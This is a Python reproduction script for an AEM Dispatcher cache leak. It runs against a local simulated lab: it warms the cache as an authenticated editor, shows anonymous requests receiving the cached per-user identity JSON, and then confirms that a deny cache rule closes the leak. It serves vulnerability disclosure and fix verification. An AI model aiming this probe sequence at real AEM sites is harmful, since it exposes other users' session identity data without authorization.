#!/usr/bin/env python3
"""
reproduce.py — scripted, self-checking reproduction of the AEM Dispatcher cache leak.

Starts the local lab (lab/aem_lab.py), runs the same probe sequence that was run
against the field hosts, asserts the expected observation at each step, then
restarts the dispatcher with the deny rule and asserts the leak is gone.

Exit code 0 means: the bug reproduced and the fix closed it.

    python3 lab/reproduce.py            # vulnerable, then patched
    python3 lab/reproduce.py --json     # machine-readable result
"""
from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import aem_lab  # noqa: E402

CURRENT_USER = aem_lab.CURRENT_USER
PROFILE = aem_lab.PROFILE
USERINFO = aem_lab.USERINFO
BASE = "http://127.0.0.1:18090"


def get(path: str, cookie: str | None = None):
    headers = {"User-Agent": "aem-lab/1.0", "Accept": "*/*"}
    if cookie is not None:
        headers["Cookie"] = cookie
    req = urllib.request.Request(BASE + path, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def line(label: str, path: str, status: int, headers: dict, body: bytes, indent: str = "    "):
    state = headers.get("X-Dispatcher-Cache", "-")
    ctype = headers.get("Content-Type", "-").split(";")[0]
    print(f"{indent}GET {path}")
    print(f"{indent}  -> {status}  {ctype:<16} cache={state:<6} dispatcher={headers.get('X-Dispatcher','-')}")
    if ctype == "application/json":
        try:
            obj = json.loads(body)
        except ValueError:
            return
        if isinstance(obj, dict) and "authorizableId" in obj:
            print(f"{indent}  identity: {json.dumps(obj)}")
    elif ctype == "text/html":
        print(f"{indent}  body: SAML auto-submit page ({len(body)} B) — the 'log in' response")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()

    results = []
    print("AEM Dispatcher cache leak — local reproduction")
    print("origin: simulated AEM 6.5 author tier · dispatcher: simulated Apache/Dispatcher")
    print(f"run: {time.strftime('%Y-%m-%d %H:%M:%SZ', time.gmtime())}")
    print()

    _, servers = aem_lab.start("vulnerable")
    try:
        print("mode: vulnerable (default cache rule: /libs/* cacheable)")
        print("-" * 96)

        print("[0] warm the cache as an authenticated editor")
        s, h, b = get(CURRENT_USER, cookie="SESSION=editor-session")
        line("warm", CURRENT_USER + "  (Cookie: SESSION=editor-session)", s, h, b)
        results.append(("warm", s, h.get("X-Dispatcher-Cache")))
        time.sleep(1.1)

        print("\n[1] identical URL, anonymous — no cookie, no Authorization header")
        s, h, b = get(CURRENT_USER)
        line("anon", CURRENT_USER, s, h, b)
        leaked = s == 200 and b'"authorizableId"' in b
        results.append(("anon", s, h.get("X-Dispatcher-Cache")))

        print("\n[2] control — change the cache key with a query string")
        s2, h2, b2 = get(CURRENT_USER + "?_=1")
        line("miss", CURRENT_USER + "?_=1", s2, h2, b2)
        results.append(("miss", s2, h2.get("X-Dispatcher-Cache")))

        print("\n[3] control — the cache key is not the session")
        s3, h3, b3 = get(CURRENT_USER, cookie="SESSION=not-a-real-session")
        line("wrong-cookie", CURRENT_USER + "  (Cookie: SESSION=not-a-real-session)", s3, h3, b3)
        results.append(("wrong-cookie", s3, h3.get("X-Dispatcher-Cache")))

        print("\n[4] neighbour control — other protected paths still challenge")
        s4, h4, b4 = get(PROFILE)
        line("profile", PROFILE, s4, h4, b4)
        s5, h5, b5 = get(USERINFO)
        line("userinfo", USERINFO, s5, h5, b5)
        results.append(("profile", s4, h4.get("X-Dispatcher-Cache")))
        results.append(("userinfo", s5, h5.get("X-Dispatcher-Cache")))

        print()
        ok_vuln = leaked and s2 == 401 and s4 == 200 and s5 == 401
        print(("RESULT: VULNERABLE — the dispatcher served a per-session identity to an "
               "anonymous client, and only the exact path was cached") if ok_vuln
              else "RESULT: unexpected — see the observations above")
    finally:
        aem_lab.stop(servers)

    print()
    _, servers = aem_lab.start("patched")
    try:
        print("mode: patched (/cache/rules deny /libs/granite/security/*)")
        print("-" * 96)
        print("[5] same two requests after the deny rule")
        p1, ph1, pb1 = get(CURRENT_USER)
        line("patched", CURRENT_USER, p1, ph1, pb1)
        p2, ph2, pb2 = get(CURRENT_USER + "?_=1")
        line("patched", CURRENT_USER + "?_=1", p2, ph2, pb2)
        print()
        ok_patch = p1 == 401 and p2 == 401
        print("RESULT: FIXED — no cache entry is created; the origin's authentication "
              "policy applies to every anonymous request" if ok_patch
              else "RESULT: unexpected — patched mode still returned data")
    finally:
        aem_lab.stop(servers)

    if args.json:
        print(json.dumps({"vulnerable_reproduced": bool(ok_vuln),
                          "patched_blocks": bool(ok_patch),
                          "observations": results}, indent=2))
    return 0 if (ok_vuln and ok_patch) else 1


if __name__ == "__main__":
    raise SystemExit(main())
